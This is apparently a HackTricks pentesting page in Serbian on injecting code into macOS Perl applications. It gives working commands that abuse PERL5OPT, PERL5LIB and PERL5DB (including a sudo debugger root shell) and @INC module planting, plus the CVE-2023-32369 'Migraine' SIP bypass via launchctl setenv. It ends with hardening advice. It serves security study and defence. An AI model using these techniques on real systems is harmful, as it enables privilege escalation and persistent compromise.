# macOS Perl Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## Via `PERL5OPT` & `PERL5LIB` env variable

Korišćenjem env variable **`PERL5OPT`** moguće je naterati **Perl** da izvrši proizvoljne komande kada se interpreter pokrene (čak **pre** nego što se parsira prvi red ciljne skripte).
Na primer, kreirajte ovu skriptu:
```perl:test.pl
#!/usr/bin/perl
print "Hello from the Perl script!\n";
```
Sada **izvezite env promenljivu** i izvršite **perl** skriptu:
```bash
export PERL5OPT='-Mwarnings;system("whoami")'
perl test.pl # This will execute "whoami"
```
Druga opcija je da kreirate Perl modul (npr. `/tmp/pmod.pm`):
```perl:/tmp/pmod.pm
#!/usr/bin/perl
package pmod;
system('whoami');
1; # Modules must return a true value
```
A zatim koristite env promenljive kako bi modul bio automatski pronađen i učitan:
```bash
PERL5LIB=/tmp/ PERL5OPT=-Mpmod perl victim.pl
```
### Druge interesantne environment variables

* **`PERL5DB`** – kada se interpreter pokrene sa **`-d`** (debugger) flagom, sadržaj promenljive `PERL5DB` se izvršava kao Perl code *unutar* debugger contexta.
Ako možete da utičete i na environment i na command-line flags privilegovanog Perl procesa, možete uraditi nešto poput:

```bash
export PERL5DB='system("/bin/zsh")'
sudo perl -d /usr/bin/some_admin_script.pl   # will drop a shell before executing the script
```

* **`PERL5SHELL`** – na Windowsu ova promenljiva kontroliše koji shell executable će Perl koristiti kada treba da pokrene shell. Ovde se navodi samo radi potpunosti, jer nije relevantna na macOS-u.

Iako `PERL5DB` zahteva `-d` switch, često se mogu pronaći maintenance ili installer scripts koji se izvršavaju kao *root* sa omogućenim ovim flagom radi verbose troubleshooting-a, zbog čega ova promenljiva predstavlja validan escalation vector.

## Via dependencies (@INC abuse)

Moguće je izlistati include path koji će Perl pretraživati (**`@INC`**) pokretanjem:
```bash
perl -e 'print join("\n", @INC)'
```
Tipičan izlaz na macOS 13/14 izgleda ovako:
```bash
/Library/Perl/5.30/darwin-thread-multi-2level
/Library/Perl/5.30
/Network/Library/Perl/5.30/darwin-thread-multi-2level
/Network/Library/Perl/5.30
/Library/Perl/Updates/5.30.3
/System/Library/Perl/5.30/darwin-thread-multi-2level
/System/Library/Perl/5.30
/System/Library/Perl/Extras/5.30/darwin-thread-multi-2level
/System/Library/Perl/Extras/5.30
```
Neke od vraćenih fascikli čak i ne postoje, međutim **`/Library/Perl/5.30`** postoji, *nije* zaštićen SIP-om i nalazi se *pre* fascikli zaštićenih SIP-om. Stoga, ako možete da pišete kao *root*, možete ubaciti maliciozni modul (npr. `File/Basename.pm`) koji će *prioritetno* učitati svaka privilegovana skripta koja uvozi taj modul.

> [!WARNING]
> I dalje vam je potreban **root** za pisanje unutar `/Library/Perl`, a macOS će prikazati **TCC** prompt koji od procesa koji obavlja operaciju pisanja zahteva *Full Disk Access*.

Na primer, ako skripta uvozi **`use File::Basename;`**, bilo bi moguće kreirati `/Library/Perl/5.30/File/Basename.pm` koji sadrži code pod kontrolom napadača.

## SIP bypass via Migration Assistant (CVE-2023-32369 “Migraine”)

U maju 2023. Microsoft je otkrio **CVE-2023-32369**, nazvan **Migraine**, post-exploitation tehniku koja napadaču sa *root* privilegijama omogućava da u potpunosti **zaobiđe System Integrity Protection (SIP)**.
Ranjiiva komponenta je **`systemmigrationd`**, daemon sa privilegijom **`com.apple.rootless.install.heritable`**. Svaki child process koji pokrene ovaj daemon nasleđuje privilegiju i zbog toga radi **izvan** SIP ograničenja.<sup>[[1]](#references)</sup>

Među procesima koje su istraživači identifikovali nalazi se i Apple-signed interpreter:<sup>[[1]](#references)</sup>
```
/usr/bin/perl /usr/libexec/migrateLocalKDC …
```
Pošto Perl poštuje `PERL5OPT` (a Bash poštuje `BASH_ENV`), trovanje *okruženja* daemon-a dovoljno je za dobijanje proizvoljnog izvršavanja u kontekstu bez SIP-a:<sup>[[1]](#references)[[2]](#references)</sup>
```bash
# As root
launchctl setenv PERL5OPT '-Mwarnings;system("/private/tmp/migraine.sh")'

# Trigger a migration (or just wait – systemmigrationd will eventually spawn perl)
open -a "Migration Assistant.app"   # or programmatically invoke /System/Library/PrivateFrameworks/SystemMigration.framework/Resources/MigrationUtility
```
Kada se pokrene `migrateLocalKDC`, `/usr/bin/perl` se pokreće sa malicioznim `PERL5OPT` i izvršava `/private/tmp/migraine.sh` *pre nego što se SIP ponovo omogući*. Iz te skripte možete, na primer, kopirati payload u **`/System/Library/LaunchDaemons`** ili dodeliti prošireni atribut `com.apple.rootless` kako bi fajl postao **nemoguć za brisanje**.

Apple je rešio problem u macOS verzijama **Ventura 13.4**, **Monterey 12.6.6** i **Big Sur 11.7.7**, ali stariji ili nezakrpljeni sistemi i dalje mogu biti eksploatisani.<sup>[[1]](#references)</sup>

## Preporuke za hardening

1. **Obrišite opasne promenljive** – privilegovani launchdaemons ili cron poslovi treba da se pokreću sa čistim okruženjem (`launchctl unsetenv PERL5OPT`, `env -i`, itd.).
2. **Izbegavajte pokretanje interpretera kao root** osim kada je to striktno neophodno. Koristite kompajlirane binarne fajlove ili rano smanjite privilegije.
3. **Skripte isporučujte sa `-T` (taint mode)** kako bi Perl ignorisao `PERL5OPT` i druge nebezbedne opcije kada je provera taint-a omogućena.
4. **Redovno ažurirajte macOS** – “Migraine” je u potpunosti zakrpljen u aktuelnim izdanjima.

## Reference

- [1] [Microsoft Security Blog – Nova macOS ranjivost, Migraine, mogla je da zaobiđe System Integrity Protection (CVE-2023-32369)](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
- [2] [Hackyboiz – macOS: Part1 - SIP Bypass](https://hackyboiz.github.io/2025/05/11/clalxk/MacOS_SIP-Bypass_en/)

{{#include ../../../banners/hacktricks-training.md}}
